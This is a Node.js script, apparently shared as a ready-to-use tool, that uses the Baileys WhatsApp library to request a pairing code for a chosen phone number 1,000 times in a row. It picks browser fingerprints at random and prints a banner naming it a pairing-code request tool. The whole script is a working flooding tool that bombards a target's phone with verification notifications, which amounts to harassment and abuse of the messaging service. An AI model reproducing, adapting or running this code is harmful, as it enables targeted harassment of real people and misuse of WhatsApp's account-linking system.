const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const fs = require('fs');
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

const colors = ['\x1b[31m', '\x1b[32m', '\x1b[33m', '\x1b[34m', '\x1b[35m', '\x1b[36m'];
const themeColor = colors[Math.floor(Math.random() * colors.length)];
const resetColor = '\x1b[0m';

const browsers = [
    ["Ubuntu", "Chrome", "120.0.0"],
    ["macOS", "Safari", "17.3"],
    ["Windows", "Edge", "121.0.0"],
    ["Ubuntu", "Firefox", "122.0.0"],
    ["Android", "Chrome", "119.0.0"],
    ["iOS", "Safari", "16.6"]
];
const randomBrowser = browsers[Math.floor(Math.random() * browsers.length)];

const target = ''; // Nomor langsung ditentukan di sini
const amount = 1000; // Jumlah permintaan pairing code

async function startSocket() {
    const { state } = await useMultiFileAuthState('./69/session');
    const sock = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: randomBrowser
    });

    for (let i = 0; i < amount; i++) {
        try {
            let code = await sock.requestPairingCode(target);
            code = code?.match(/.{1,4}/g)?.join("-") || code;
            console.log(themeColor + `Success [${i + 1}/${amount}] → Code sent to: ${target}` + resetColor);
        } catch (err) {
            console.error(themeColor + `Error [${i + 1}/${amount}] → ${err.message}`);
            await sleep(10000);
            process.exit(1);
        }
        await sleep(5000); // Delay 1 detik tiap request
    }

    console.log(themeColor + "Finished sending pairing code requests." + resetColor);
}

console.log(themeColor + `
──────────────────────────────────────────────
        WhatsApp Pairing Code Request Tool
──────────────────────────────────────────────
Author      : Obscuraworks, Inc.
Website     : https://www.obscuraworks.com
Version     : v1.0
──────────────────────────────────────────────
Target      : ${target}
Requests    : ${amount}
──────────────────────────────────────────────
` + resetColor);

startSocket();
